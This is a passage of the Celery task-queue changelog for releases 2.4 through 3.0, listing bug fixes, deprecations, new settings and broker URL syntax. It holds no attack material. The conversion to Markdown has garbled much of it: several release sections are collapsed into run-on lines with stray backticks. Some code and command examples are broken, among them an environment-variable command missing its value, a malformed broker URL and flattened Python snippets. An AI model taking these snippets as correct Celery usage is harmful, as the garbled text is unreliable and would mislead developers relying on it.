    Ask Solem

<!-- end list -->

  - `celeryctl inspect` commands was missing output.
  - processes pool: Decrease polling interval for less idle CPU usage.
  - processes pool: MaybeEncodingError wasn't wrapped in ExceptionInfo (Issue \#524).
  - worker: would silence errors occurring after task consumer started.
  - logging: Fixed a bug where unicode in stdout redirected log messages couldn't be written (Issue \#522).

## 2.4.0

  - release-date  
    2011-11-04 04:00 p.m. GMT

  - release-by  
    Ask Solem

### Important Notes

  - Now supports Python 3.

  - Fixed deadlock in worker process handling (Issue \#496).
    
    > A deadlock could occur after spawning new child processes because the logging library's mutex wasn't properly reset after fork.
    > 
    > The symptoms of this bug affecting would be that the worker simply stops processing tasks, as none of the workers child processes are functioning. There was a greater chance of this bug occurring with `maxtasksperchild` or a time-limit enabled.
    > 
    > This is a workaround for <http://bugs.python.org/issue6721#msg140215>.
    > 
    > Be aware that while this fixes the logging library lock, there could still be other locks initialized in the parent process, introduced by custom code.
    > 
    > Fix contributed by Harm Verhagen.

  - AMQP Result backend: Now expires results by default.
    
    > The default expiration value is now taken from the `CELERY_TASK_RESULT_EXPIRES` setting.
    > 
    > The old `CELERY_AMQP_TASK_RESULT_EXPIRES` setting has been deprecated and will be removed in version 4.0.
    > 
    > Note that this means that the result backend requires RabbitMQ 2.1.0 or higher, and that you have to disable expiration if you're running with an older version. You can do so by disabling the `CELERY_TASK_RESULT_EXPIRES` setting:
    > 
    >     CELERY_TASK_RESULT_EXPIRES = None

  - Eventlet: Fixed problem with shutdown (Issue \#457).

\* Broker transports can be now be specified using URLs

> The broker can now be specified as a URL instead. This URL must have the format:
> 
>   - \`\`\`text  
>     transport://user:<password@hostname>:port/virtual\_host
> 
> for example the default broker is written as:
> 
> ``` text
> amqp://guest:guest@localhost:5672//
> ```
> 
> The scheme is required, so that the host is identified as a URL and not just a host name. User, password, port and virtual\_host are optional and defaults to the particular transports default value.
> 
> \> **Note**

  - \>  
    Note that the path component (virtual\_host) always starts with a forward-slash. This is necessary to distinguish between the virtual host `''` (empty) and `'/'`, which are both acceptable virtual host names.
    
    A virtual host of `'/'` becomes:
    
    ``` text
    amqp://guest:guest@localhost:5672//
    ```
    
    and a virtual host of `''` (empty) becomes:
    
    ``` text
    amqp://guest:guest@localhost:5672/
    ```
    
    So the leading slash in the path component is **always required**.
    
    In addition the `BROKER_URL` setting has been added as an alias to `BROKER_HOST`. Any broker setting specified in both the URL and in the configuration will be ignored, if a setting isn't provided in the URL then the value from the configuration will be used as default.
    
    Also, programs now support the `--broker <celery --broker>` option to specify a broker URL on the command-line:
    
    ``` console
    ```
    
    $ celery worker -b <redis://localhost>
    
    $ celery inspect -b amqp://guest:<guest@localhost>//e
    
    The environment variable `CELERY_BROKER_URL` can also be used to easily override the default broker used.

<!-- end list -->

  - The deprecated <span class="title-ref">celery.loaders.setup\_loader</span> function has been removed.

  - The `CELERY_TASK_ERROR_WHITELIST` setting has been replaced by a more flexible approach (Issue \#447).
    
    > The error mail sending logic is now available as `Task.ErrorMail`, with the implementation (for reference) in `celery.utils.mail`.
    > 
    > The error mail class can be sub-classed to gain complete control of when error messages are sent, thus removing the need for a separate white-list setting.
    > 
    > The `CELERY_TASK_ERROR_WHITELIST` setting has been deprecated, and will be removed completely in version 4.0.

  - Additional Deprecations
    
    > The following functions has been deprecated and is scheduled for removal in version 4.0:
    > 
    > | **Old function**                                              | **Alternative**                                           |
    > | ------------------------------------------------------------- | --------------------------------------------------------- |
    > | <span class="title-ref">celery.loaders.current\_loader</span> | <span class="title-ref">celery.current\_app.loader</span> |
    > | <span class="title-ref">celery.loaders.load\_settings</span>  | <span class="title-ref">celery.current\_app.conf</span>   |
    > | <span class="title-ref">celery.execute.apply</span>           | <span class="title-ref">Task.apply</span>                 |
    > | <span class="title-ref">celery.execute.apply\_async</span>    | <span class="title-ref">Task.apply\_async</span>          |
    > | <span class="title-ref">celery.execute.delay\_task</span>     | <span class="title-ref">celery.execute.send\_task</span>  |
    > 

    > The following settings has been deprecated and is scheduled for removal in version 4.0:
    > 
    > | **Old setting**                                       | **Alternative**             |
    > | ----------------------------------------------------- | --------------------------- |
    > | <span class="title-ref">CELERYD\_LOG\_LEVEL</span>    | `celery worker --loglevel=` |
    > | <span class="title-ref">CELERYD\_LOG\_FILE</span>     | `celery worker --logfile=`  |
    > | <span class="title-ref">CELERYBEAT\_LOG\_LEVEL</span> | `celery beat --loglevel=`   |
    > | <span class="title-ref">CELERYBEAT\_LOG\_FILE</span>  | `celery beat --logfile=`    |
    > | <span class="title-ref">CELERYMON\_LOG\_LEVEL</span>  | `celerymon --loglevel=`     |
    > | <span class="title-ref">CELERYMON\_LOG\_FILE</span>   | `celerymon --logfile=`      |
    > 

<div id="v240-news">

News `` ` ----  * No longer depends on :pypi:`pyparsing`.  * Now depends on Kombu 1.4.3.  * CELERY_IMPORTS can now be a scalar value (Issue #485).      It's too easy to forget to add the comma after the sole element of a     tuple, and this is something that often affects newcomers.      The docs should probably use a list in examples, as using a tuple     for this doesn't even make sense. Nonetheless, there are many     tutorials out there using a tuple, and this change should be a help     to new users.      Suggested by :github_user:`jsaxon-cars`.  * Fixed a memory leak when using the thread pool (Issue #486).      Contributed by Kornelijus Survila.  * The ``statedb`wasn't saved at exit.      This has now been fixed and it should again remember previously     revoked tasks when a`--statedb``is enabled.  * Adds :setting:`EMAIL_USE_TLS` to enable secure SMTP connections   (Issue #418).      Contributed by Stefan Kjartansson.  * Now handles missing fields in task messages as documented in the message   format documentation.      * Missing required field throws `~@InvalidTaskError`     * Missing args/kwargs is assumed empty.      Contributed by Chris Chamberlin.  * Fixed race condition in :mod:`celery.events.state` (``celerymon`/`celeryev``)   where task info would be removed while iterating over it (Issue #501).  * The Cache, Cassandra, MongoDB, Redis and Tyrant backends now respects   the :setting:`CELERY_RESULT_SERIALIZER` setting (Issue #435).      This means that only the database (Django/SQLAlchemy) backends     currently doesn't support using custom serializers.      Contributed by Steeve Morin  * Logging calls no longer manually formats messages, but delegates   that to the logging system, so tools like Sentry can easier   work with the messages (Issue #445).      Contributed by Chris Adams.  *``multi`now supports a`stop\_verify``command to wait for   processes to shutdown.  * Cache backend didn't work if the cache key was unicode (Issue #504).      Fix contributed by Neil Chintomby.  * New setting :setting:`CELERY_RESULT_DB_SHORT_LIVED_SESSIONS` added,   which if enabled will disable the caching of SQLAlchemy sessions   (Issue #449).      Contributed by Leo Dirac.  * All result backends now implements``\_\_reduce\_\_`so that they can   be pickled (Issue #441).      Fix contributed by Remy Noel  * multi didn't work on Windows (Issue #472).  * New-style`[CELERY\_REDIS]()*\`\` settings now takes precedence over the old \`\`REDIS\_*``configuration keys (Issue #508).      Fix contributed by Joshua Ginsberg  * Generic beat init-script no longer sets `bash -e` (Issue #510).      Fix contributed by Roger Hu.  * Documented that Chords don't work well with :command:`redis-server` versions   before 2.2.      Contributed by Dan McGee.  * The :setting:`CELERYBEAT_MAX_LOOP_INTERVAL` setting wasn't respected.  *``inspect.registered\_tasks`renamed to`inspect.registered`for naming   consistency.      The previous name is still available as an alias.      Contributed by Mher Movsisyan  * Worker logged the string representation of args and kwargs   without safe guards (Issue #480).  * RHEL init-script: Changed worker start-up priority.      The default start / stop priorities for MySQL on RHEL are:`\`console \# chkconfig: - 64 36

</div>

> Therefore, if Celery is using a database as a broker / message store, it should be started after the database is up and running, otherwise errors will ensue. This commit changes the priority in the init-script to:
> 
> ``` console
> # chkconfig: - 85 15
> ```
> 
> which are the default recommended settings for 3-rd party applications and assure that Celery will be started after the database service & shut down before it terminates.
> 
> Contributed by Yury V. Zaytsev.

  - KeyValueStoreBackend.get\_many didn't respect the `timeout` argument (Issue \#512).

  - beat/events's `--workdir` option didn't `chdir(2)` before after configuration was attempted (Issue \#506).

  - After deprecating 2.4 support we can now name modules correctly, since we can take use of absolute imports.
    
    > Therefore the following internal modules have been renamed:
    > 
    > > `celery.concurrency.evlet` -\> `celery.concurrency.eventlet` `celery.concurrency.evg` -\> `celery.concurrency.gevent`

\* `AUTHORS` file is now sorted alphabetically.

> Also, as you may have noticed the contributors of new features/fixes are now mentioned in the Changelog.

\`\`\`

---

changelog-2.5.md

---

# Change history for Celery 2.5

This document contains change notes for bugfix releases in the 2.5.x series, please see \[whatsnew-2.5\](\#whatsnew-2.5) for an overview of what's new in Celery 2.5.

If you're looking for versions prior to 2.5 you should visit our \[history\](\#history) of releases.

<div class="contents" data-local="">

</div>

## 2.5.5

  - release-date  
    2012-06-06 04:00 p.m. BST

  - release-by  
    Ask Solem

This is a dummy release performed for the following goals:

  - Protect against force upgrading to Kombu 2.2.0
  - Version parity with `django-celery`

## 2.5.3

  - release-date  
    2012-04-16 07:00 p.m. BST

  - release-by  
    Ask Solem

<!-- end list -->

  - A bug causes messages to be sent with UTC time-stamps even though `CELERY_ENABLE_UTC` wasn't enabled (Issue \#636).
  - `celerybeat`: No longer crashes if an entry's args is set to None (Issue \#657).
  - Auto-reload didn't work if a module's `__file__` attribute was set to the modules `.pyc` file. (Issue \#647).
  - Fixes early 2.5 compatibility where `__package__` doesn't exist (Issue \#638).

## 2.5.2

  - release-date  
    2012-04-13 04:30 p.m. GMT

  - release-by  
    Ask Solem

### News

  - Now depends on Kombu 2.1.5.

  - Django documentation has been moved to the main Celery docs.
    
    > See \[django\](\#django).

  - New `celeryd_init` signal can be used to configure workers by hostname.

  - Signal.connect can now be used as a decorator.
    
    > Example:
    > 
    >   - \`\`\`python  
    >     from celery.signals import task\_sent
    >     
    >     @task\_sent.connect def on\_task\_sent(\*\*kwargs): print('sent task: %r' % (kwargs,))

  - Invalid task messages are now rejected instead of acked.
    
    > This means that they will be moved to the dead-letter queue introduced in the latest RabbitMQ version (but must be enabled manually, consult the RabbitMQ documentation).

  - Internal logging calls has been cleaned up to work better with tools like Sentry.
    
    > Contributed by David Cramer.

  - New method `subtask.clone()` can be used to clone an existing subtask with augmented arguments/options.
    
    > Example:
    > 
    > ``` pycon
    > >>> s = add.subtask((5,))
    > >>> new = s.clone(args=(10,), countdown=5})
    > >>> new.args
    > (10, 5)
    > 
    > >>> new.options
    > {'countdown': 5}
    > ```

  - Chord callbacks are now triggered in eager mode.

<div id="v252-fixes">

Fixes `` ` -----  - Programs now verifies that the pidfile is actually written correctly   (Issue #641).      Hopefully this will crash the worker immediately if the system     is out of space to store the complete pidfile.      In addition, we now verify that existing pidfiles contain     a new line so that a partially written pidfile is detected as broken,     as before doing: ``\`console $ echo -n "1" \> celeryd.pid

</div>

> would cause the worker to think that an existing instance was already running (init has pid 1 after all).

  - Fixed 2.5 compatibility issue with use of print\_exception.
    
    > Fix contributed by Martin Melin.

  - Fixed 2.5 compatibility issue with imports.
    
    > Fix contributed by Iurii Kriachko.

  - All programs now fix up `__package__` when called as main.
    
    > This fixes compatibility with Python 2.5.
    > 
    > Fix contributed by Martin Melin.

  - \[celery control|inspect\] can now be configured on the command-line.
    
    > Like with the worker it is now possible to configure Celery settings on the command-line for celery control|inspect
    > 
    > ``` console
    > $ celery inspect -- broker.pool_limit=30
    > ```

  - Version dependency for `python-dateutil` fixed to be strict.
    
    > Fix contributed by Thomas Meson.

  - `Task.__call__` is now optimized away in the task tracer rather than when the task class is created.
    
    > This fixes a bug where a custom \_\_call\_\_ may mysteriously disappear.

  - Auto-reload's `inotify` support has been improved.
    
    > Contributed by Mher Movsisyan.

  - The Django broker documentation has been improved.

  - Removed confusing warning at top of routing user guide.

<div id="version-2.5.1">

2.5.1 `` ` ===== :release-date: 2012-03-01 01:00 p.m. GMT :release-by: Ask Solem  .. _v251-fixes:  Fixes -----  * Eventlet/Gevent: A small typo caused the worker to hang when eventlet/gevent   was used, this was because the environment wasn't monkey patched   early enough.  * Eventlet/Gevent: Another small typo caused the mediator to be started   with eventlet/gevent, which would make the worker sometimes hang at shutdown.  * :mod:`multiprocessing`: Fixed an error occurring if the pool was stopped   before it was properly started.  * Proxy objects now redirects ``\_\_doc\_\_`and`\_\_name\_\_`so`help(obj)\`\` works.

</div>

  - Internal timer (timer2) now logs exceptions instead of swallowing them (Issue \#626).
  - celery shell: can now be started with `--eventlet <celery shell --eventlet>` or `--gevent <celery shell --gevent>` options to apply their monkey patches.

## 2.5.0

  - release-date  
    2012-02-24 04:00 p.m. GMT

  - release-by  
    Ask Solem

See \[whatsnew-2.5\](\#whatsnew-2.5).

Since the changelog has gained considerable size, we decided to do things differently this time: by having separate "what's new" documents for major version changes.

Bugfix releases will still be found in the changelog.

---

changelog-3.0.md

---

# Change history for Celery 3.0

<div class="contents" data-local="">

</div>

If you're looking for versions prior to 3.0.x you should go to \[history\](\#history).

## 3.0.24

  - release-date  
    2013-10-11 04:40 p.m. BST

  - release-by  
    Ask Solem

<!-- end list -->

  - Now depends on \[Kombu 2.5.15 \<kombu:version-2.5.15\>\](\#kombu-2.5.15-\<kombu:version-2.5.15\>).

  - Now depends on `billiard` version 2.7.3.34.

  - AMQP Result backend: No longer caches queue declarations.
    
    > The queues created by the AMQP result backend are always unique, so caching the declarations caused a slow memory leak.

  - Worker: Fixed crash when hostname contained Unicode characters.
    
    > Contributed by Daodao.

  - The worker would no longer start if the <span class="title-ref">-P solo</span> pool was selected (Issue \#1548).

  - Redis/Cache result backends wouldn't complete chords if any of the tasks were retried (Issue \#1401).

  - Task decorator is no longer lazy if app is finalized.

  - AsyncResult: Fixed bug with `copy(AsyncResult)` when no `current_app` available.

  - ResultSet: Now properly propagates app when passed string id's.

  - Loader now ignores `CELERY_CONFIG_MODULE` if value is empty string.

  - Fixed race condition in Proxy object where it tried to delete an attribute twice, resulting in <span class="title-ref">AttributeError</span>.

  - Task methods now works with the `CELERY_ALWAYS_EAGER` setting (Issue \#1478).

  - <span class="title-ref">\~kombu.common.Broadcast</span> queues were accidentally declared when publishing tasks (Issue \#1540).

  - New `C_FAKEFORK` environment variable can be used to debug the init-scripts.
    
    > Setting this will skip the daemonization step so that errors printed to stderr after standard outs are closed can be seen:
    > 
    >   - \`\`\`console  
    >     $ C\_FAKEFORK /etc/init.d/celeryd start
    > 
    > This works with the <span class="title-ref">celery multi</span> command in general.

\- `get_pickleable_etype` didn't always return a value (Issue \#1556). `` ` - Fixed bug where ``app.GroupResult.restore``would fall back to the default   app.  - Fixed rare bug where built-in tasks would use the current_app.  - `~celery.platforms.maybe_fileno` now handles `ValueError`.  .. _version-3.0.23:  3.0.23 ====== :release-date: 2013-09-02 01:00 p.m. BST :release-by: Ask Solem  - Now depends on [Kombu 2.5.14 <kombu:version-2.5.14>](#kombu-2.5.14-<kombu:version-2.5.14>).  -``send\_task`didn't honor`link`and`link\_error``arguments.      This had the side effect of chains not calling unregistered tasks,     silently discarding them.      Fix contributed by Taylor Nelson.  - :mod:`celery.state`: Optimized precedence lookup.      Contributed by Matt Robenolt.  - POSIX: Daemonization didn't redirect``sys.stdin`to`/dev/null`.      Fix contributed by Alexander Smirnov.  - Canvas: group bug caused fallback to default app when`.apply\_async``used   (Issue #1516)  - Canvas: generator arguments wasn't always pickleable.  .. _version-3.0.22:  3.0.22 ====== :release-date: 2013-08-16 04:30 p.m. BST :release-by: Ask Solem  - Now depends on [Kombu 2.5.13 <kombu:version-2.5.13>](#kombu-2.5.13-<kombu:version-2.5.13>).  - Now depends on :pypi:`billiard` 2.7.3.32  - Fixed bug with monthly and yearly Crontabs (Issue #1465).      Fix contributed by Guillaume Gauvrit.  - Fixed memory leak caused by time limits (Issue #1129, Issue #1427)  - Worker will now sleep if being restarted more than 5 times   in one second to avoid spamming with``worker-online``events.  - Includes documentation fixes      Contributed by: Ken Fromm, Andreas Savvides, Alex Kiriukha,     Michael Fladischer.  .. _version-3.0.21:  3.0.21 ====== :release-date: 2013-07-05 04:30 p.m. BST :release-by: Ask Solem  - Now depends on :pypi:`billiard` 2.7.3.31.      This version fixed a bug when running without the billiard C extension.  - 3.0.20 broke eventlet/gevent support (worker not starting).  - Fixed memory leak problem when MongoDB result backend was used with the   gevent pool.      Fix contributed by Ross Lawley.  .. _version-3.0.20:  3.0.20 ====== :release-date: 2013-06-28 04:00 p.m. BST :release-by: Ask Solem  - Contains workaround for deadlock problems.      A better solution will be part of Celery 3.1.  - Now depends on [Kombu 2.5.12 <kombu:version-2.5.12>](#kombu-2.5.12-<kombu:version-2.5.12>).  - Now depends on :pypi:`billiard` 2.7.3.30.  - :option:`--loader <celery --loader>` argument no longer supported   importing loaders from the current directory.  - [Worker] Fixed memory leak when restarting after connection lost   (Issue #1325).  - [Worker] Fixed UnicodeDecodeError at start-up (Issue #1373).      Fix contributed by Jessica Tallon.  - [Worker] Now properly rewrites unpickleable exceptions again.  - Fixed possible race condition when evicting items from the revoked task set.  - [generic-init.d] Fixed compatibility with Ubuntu's minimal Dash   shell (Issue #1387).      Fix contributed by :github_user:`monkut`.  -``Task.apply`/`ALWAYS\_EAGER``now also executes callbacks and errbacks   (Issue #1336).  - [Worker] The :signal:`worker-shutdown` signal was no longer being dispatched   (Issue #1339)j  - [Python 3] Fixed problem with threading.Event.      Fix contributed by Xavier Ordoquy.  - [Python 3] Now handles``io.UnsupportedOperation`that may be raised   by`file.fileno()`in Python 3.  - [Python 3] Fixed problem with`qualname`.  - [events.State] Now ignores unknown event-groups.  - [MongoDB backend] No longer uses deprecated`safe``parameter.      Fix contributed by :github_user:`rfkrocktk`.  - The eventlet pool now imports on Windows.  - [Canvas] Fixed regression where immutable chord members may receive   arguments (Issue #1340).      Fix contributed by Peter Brook.  - [Canvas] chain now accepts generator argument again (Issue #1319).  -``celery.migrate``command now consumes from all queues if no queues   specified.      Fix contributed by John Watson.  .. _version-3.0.19:  3.0.19 ====== :release-date: 2013-04-17 04:30:00 p.m. BST :release-by: Ask Solem  - Now depends on :pypi:`billiard` 2.7.3.28  - A Python 3 related fix managed to disable the deadlock fix   announced in 3.0.18.      Tests have been added to make sure this doesn't happen again.  - Task retry policy:  Default max_retries is now 3.      This ensures clients won't be hanging while the broker is down.      > **Note** >          You can set a longer retry for the worker by         using the :signal:`celeryd_after_setup` signal:``\`python from celery.signals import celeryd\_after\_setup

> @celeryd\_after\_setup.connect def configure\_worker(instance, conf, \*\*kwargs): conf.CELERY\_TASK\_PUBLISH\_RETRY\_POLICY = { 'max\_retries': 100, 'interval\_start': 0, 'interval\_max': 1, 'interval\_step': 0.2, }

  - Worker: Will now properly display message body in error messages even if the body is a buffer instance.
  - 3.0.18 broke the MongoDB result backend (Issue \#1303).

<div id="version-3.0.18">

3.0.18 `` ` ====== :release-date: 2013-04-12 05:00:00 p.m. BST :release-by: Ask Solem  - Now depends on :pypi:`kombu` 2.5.10.      See the [kombu changelog <kombu:version-2.5.10>](#kombu-changelog-<kombu:version-2.5.10>).  - Now depends on :pypi:`billiard` 2.7.3.27.  - Can now specify a white-list of accepted serializers using   the new :setting:`CELERY_ACCEPT_CONTENT` setting.      This means that you can force the worker to discard messages     serialized with pickle and other untrusted serializers.     For example to only allow JSON serialized messages use::          CELERY_ACCEPT_CONTENT = ['json']      you can also specify MIME types in the white-list::          CELERY_ACCEPT_CONTENT = ['application/json']  - Fixed deadlock in multiprocessing's pool caused by the   semaphore not being released when terminated by signal.  - Processes Pool: It's now possible to debug pool processes using GDB.  - ``celery report`now censors possibly secret settings, like passwords   and secret tokens.      You should still check the output before pasting anything     on the internet.  - Connection URLs now ignore multiple '+' tokens.  - Worker/`statedb``: Now uses pickle protocol 2 (Python 2.5+)  - Fixed Python 3 compatibility issues.  - Worker:  A warning is now given if a worker is started with the   same node name as an existing worker.  - Worker: Fixed a deadlock that could occur while revoking tasks (Issue #1297).  - Worker: The :sig:`HUP` handler now closes all open file descriptors   before restarting to ensure file descriptors doesn't leak (Issue #1270).  - Worker: Optimized storing/loading the revoked tasks list (Issue #1289).      After this change the :option:`celery worker --statedb` file will     take up more disk space, but loading from and storing the revoked     tasks will be considerably faster (what before took 5 minutes will     now take less than a second).  - Celery will now suggest alternatives if there's a typo in the   broker transport name (e.g.,``ampq`->`amqp``).  - Worker: The auto-reloader would cause a crash if a monitored file   was unlinked.      Fix contributed by Agris Ameriks.  - Fixed AsyncResult pickling error.      Fix contributed by Thomas Minor.  - Fixed handling of Unicode in logging output when using log colors   (Issue #427).  - `~celery.app.utils.ConfigurationView` is now a``MutableMapping`.      Contributed by Aaron Harnly.  - Fixed memory leak in LRU cache implementation.      Fix contributed by Romuald Brunet.  -`celery.contrib.rdb``: Now works when sockets are in non-blocking mode.      Fix contributed by Theo Spears.  - The `inspect reserved` remote control command included active (started) tasks   with the reserved tasks (Issue #1030).  - The :signal:`task_failure` signal received a modified traceback object   meant for pickling purposes, this has been fixed so that it now   receives the real traceback instead.  - The``@task``decorator silently ignored positional arguments,   it now raises the expected `TypeError` instead (Issue #1125).  - The worker will now properly handle messages with invalid   ETA/expires fields (Issue #1232).  - The``pool\_restart``remote control command now reports   an error if the :setting:`CELERYD_POOL_RESTARTS` setting isn't set.  - `@add_defaults`` can now be used with non-dict objects.

</div>

  - Fixed compatibility problems in the Proxy class (Issue \#1087).
    
    > The class attributes `__module__`, `__name__` and `__doc__` are now meaningful string objects.
    > 
    > Thanks to Marius Gedminas.

  - MongoDB Backend: The `MONGODB_BACKEND_SETTINGS` setting now accepts a `option` key that lets you forward arbitrary kwargs to the underlying `pymongo.Connection` object (Issue \#1015).

  - Beat: The daily backend cleanup task is no longer enabled for result backends that support automatic result expiration (Issue \#1031).

  - Canvas list operations now takes application instance from the first task in the list, instead of depending on the `current_app` (Issue \#1249).

  - Worker: Message decoding error log message now includes traceback information.

  - Worker: The start-up banner now includes system platform.

  - `celery inspect|status|control` now gives an error if used with a SQL based broker transport.

## 3.0.17

  - release-date  
    2013-03-22 04:00:00 p.m. UTC

  - release-by  
    Ask Solem

<!-- end list -->

  - Now depends on kombu 2.5.8

  - Now depends on billiard 2.7.3.23

  - RabbitMQ/Redis: thread-less and lock-free rate-limit implementation.
    
    > This means that rate limits pose minimal overhead when used with RabbitMQ/Redis or future transports using the event-loop, and that the rate-limit implementation is now thread-less and lock-free.
    > 
    > The thread-based transports will still use the old implementation for now, but the plan is to use the timer also for other broker transports in Celery 3.1.

  - Rate limits now works with eventlet/gevent if using RabbitMQ/Redis as the broker.

  - A regression caused `task.retry` to ignore additional keyword arguments.
    
    > Extra keyword arguments are now used as execution options again. Fix contributed by Simon Engledew.

  - Windows: Fixed problem with the worker trying to pickle the Django settings module at worker start-up.

  - generic-init.d: No longer double quotes `$CELERYD_CHDIR` (Issue \#1235).

  - generic-init.d: Removes bash-specific syntax.
    
    > Fix contributed by Pär Wieslander.

  - Cassandra Result Backend: Now handles the <span class="title-ref">\~pycassa.AllServersUnavailable</span> error (Issue \#1010).
    
    > Fix contributed by Jared Biel.

  - Result: Now properly forwards apps to GroupResults when deserializing (Issue \#1249).
    
    > Fix contributed by Charles-Axel Dein.

  - `GroupResult.revoke` now supports the `terminate` and `signal` keyword arguments.

  - Worker: Multiprocessing pool workers now import task modules/configuration before setting up the logging system so that logging signals can be connected before they're dispatched.

  - chord: The `AsyncResult` instance returned now has its `parent` attribute set to the header `GroupResult`.
    
    > This is consistent with how `chain` works.

## 3.0.16

  - release-date  
    2013-03-07 04:00:00 p.m. UTC

  - release-by  
    Ask Solem

<!-- end list -->

  - Happy International Women's Day\!
    
    > We have a long way to go, so this is a chance for you to get involved in one of the organizations working for making our communities more diverse.
    > 
    > >   - PyLadies — <http://pyladies.com>
    > >   - Girls Who Code — <http://www.girlswhocode.com>
    > >   - Women Who Code — <http://www.meetup.com/Women-Who-Code-SF/>

  - Now depends on `kombu` version 2.5.7

  - Now depends on `billiard` version 2.7.3.22

  - AMQP heartbeats are now disabled by default.
    
    > Some users experiences issues with heartbeats enabled, and it's not strictly necessary to use them.
    > 
    > If you're experiencing problems detecting connection failures, you can re-enable heartbeats by configuring the `BROKER_HEARTBEAT` setting.

  - Worker: Now propagates connection errors occurring in multiprocessing callbacks, so that the connection can be reset (Issue \#1226).

  - Worker: Now propagates connection errors occurring in timer callbacks, so that the connection can be reset.

  - The modules in `CELERY_IMPORTS` and `CELERY_INCLUDE` are now imported in the original order (Issue \#1161).
    
    > The modules in `CELERY_IMPORTS` will be imported first, then continued by `CELERY_INCLUDE`.
    > 
    > Thanks to Joey Wilhelm.

  - New bash completion for `celery` available in the git repository:
    
    > <https://github.com/celery/celery/tree/3.0/extra/bash-completion>
    > 
    > You can source this file or put it in `bash_completion.d` to get auto-completion for the `celery` command-line utility.

  - The node name of a worker can now include unicode characters (Issue \#1186).

  - The repr of a `crontab` object now displays correctly (Issue \#972).

  - `events.State` no longer modifies the original event dictionary.

  - No longer uses `Logger.warn` deprecated in Python 3.

  - Cache Backend: Now works with chords again (Issue \#1094).

  - Chord unlock now handles errors occurring while calling the callback.

  - Generic worker init.d script: Status check is now performed by querying the pid of the instance instead of sending messages.
    
    > Contributed by Milen Pavlov.

  - Improved init-scripts for CentOS.
    
    >   - Updated to support Celery 3.x conventions.
    >   - Now uses CentOS built-in `status` and `killproc`
    >   - Support for multi-node / multi-pid worker services.
    >   - Standard color-coded CentOS service-init output.
    >   - A test suite.
    > 
    > Contributed by Milen Pavlov.

  - `ResultSet.join` now always works with empty result set (Issue \#1219).

  - A `group` consisting of a single task is now supported (Issue \#1219).

  - Now supports the `pycallgraph` program (Issue \#1051).

  - Fixed Jython compatibility problems.

  - Django tutorial: Now mentions that the example app must be added to `INSTALLED_APPS` (Issue \#1192).

## 3.0.15

  - release-date  
    2013-02-11 04:30:00 p.m. UTC

  - release-by  
    Ask Solem

<!-- end list -->

  - Now depends on billiard 2.7.3.21 which fixed a syntax error crash.
  - Fixed bug with `CELERY_SEND_TASK_SENT_EVENT`.

## 3.0.14

  - release-date  
    2013-02-08 05:00:00 p.m. UTC

  - release-by  
    Ask Solem

<!-- end list -->

  - Now depends on Kombu 2.5.6

  - Now depends on billiard 2.7.3.20

  - `execv` is now disabled by default.
    
    > It was causing too many problems for users, you can still enable it using the <span class="title-ref">CELERYD\_FORCE\_EXECV</span> setting.
    > 
    > execv was only enabled when transports other than AMQP/Redis was used, and it's there to prevent deadlocks caused by mutexes not being released before the process forks. Unfortunately it also changes the environment introducing many corner case bugs that're hard to fix without adding horrible hacks. Deadlock issues are reported far less often than the bugs that execv are causing, so we now disable it by default.
    > 
    > Work is in motion to create non-blocking versions of these transports so that execv isn't necessary (which is the situation with the amqp and redis broker transports)

  - Chord exception behavior defined (Issue \#1172).
    
    > From Celery 3.1 the chord callback will change state to FAILURE when a task part of a chord raises an exception.
    > 
    > It was never documented what happens in this case, and the actual behavior was very unsatisfactory, indeed it will just forward the exception value to the chord callback.
    > 
    > For backward compatibility reasons we don't change to the new behavior in a bugfix release, even if the current behavior was never documented. Instead you can enable the `CELERY_CHORD_PROPAGATES` setting to get the new behavior that'll be default from Celery 3.1.
    > 
    > See more at \[chord-errors\](\#chord-errors).

  - worker: Fixes bug with ignored and retried tasks.
    
    > The `on_chord_part_return` and `Task.after_return` callbacks, nor the `task_postrun` signal should be called when the task was retried/ignored.
    > 
    > Fix contributed by Vlad.

  - `GroupResult.join_native` now respects the `propagate` argument.

  - `subtask.id` added as an alias to `subtask['options'].id`
    
    >   - \`\`\`pycon  
    >     \>\>\> s = add.s(2, 2) \>\>\> s.id = 'my-id' \>\>\> s\['options'\] {'task\_id': 'my-id'}
    >     
    >     \>\>\> s.id 'my-id'

  - worker: Fixed error <span class="title-ref">Could not start worker processes</span> occurring when restarting after connection failure (Issue \#1118).

  - Adds new signal `task-retried` (Issue \#1169).

  - <span class="title-ref">celery events --dumper</span> now handles connection loss.

  - Will now retry sending the task-sent event in case of connection failure.

  - amqp backend: Now uses `Message.requeue` instead of republishing the message after poll.

  - New `BROKER_HEARTBEAT_CHECKRATE` setting introduced to modify the rate at which broker connection heartbeats are monitored.
    
    > The default value was also changed from 3.0 to 2.0.

  - <span class="title-ref">celery.events.state.State</span> is now pickleable.
    
    > Fix contributed by Mher Movsisyan.

  - <span class="title-ref">celery.utils.functional.LRUCache</span> is now pickleable.
    
    > Fix contributed by Mher Movsisyan.

  - The stats broadcast command now includes the workers pid.
    
    > Contributed by Mher Movsisyan.

  - New `conf` remote control command to get a workers current configuration.
    
    > Contributed by Mher Movsisyan.

  - Adds the ability to modify the chord unlock task's countdown argument (Issue \#1146).
    
    > Contributed by Jun Sakai

  - beat: The scheduler now uses the <span class="title-ref">now()</span>\` method of the schedule, so that schedules can provide a custom way to get the current date and time.
    
    > Contributed by Raphaël Slinckx

  - Fixed pickling of configuration modules on Windows or when execv is used (Issue \#1126).

  - Multiprocessing logger is now configured with loglevel `ERROR` by default.
    
    > Since 3.0 the multiprocessing loggers were disabled by default (only configured when the `MP_LOG` environment variable was set).

<div id="version-3.0.13">

3.0.13 `` ` ====== :release-date: 2013-01-07 04:00:00 p.m. UTC :release-by: Ask Solem  - Now depends on Kombu 2.5      - :pypi:`amqp` has replaced :pypi:`amqplib` as the default transport,       gaining support for AMQP 0.9, and the RabbitMQ extensions,       including Consumer Cancel Notifications and heartbeats.      - support for multiple connection URLs for failover.      - Read more in the [Kombu 2.5 changelog <kombu:version-2.5.0>](#kombu-2.5-changelog-<kombu:version-2.5.0>).  - Now depends on billiard 2.7.3.19  - Fixed a deadlock issue that could occur when the producer pool   inherited the connection pool instance of the parent process.  - The :option:`--loader <celery --loader>` option now works again (Issue #1066).  - :program:`celery` umbrella command: All sub-commands now supports   the :option:`--workdir <celery --workdir>` option (Issue #1063).  - Groups included in chains now give GroupResults (Issue #1057)      Previously it would incorrectly add a regular result instead of a group     result, but now this works: ``\`pycon \>\>\> \# \[4 + 4, 4 + 8, 16 + 8\] \>\>\> res = (add.s(2, 2) | group(add.s(4), add.s(8), add.s(16)))() \>\>\> res \<GroupResult: a0acf905-c704-499e-b03a-8d445e6398f7 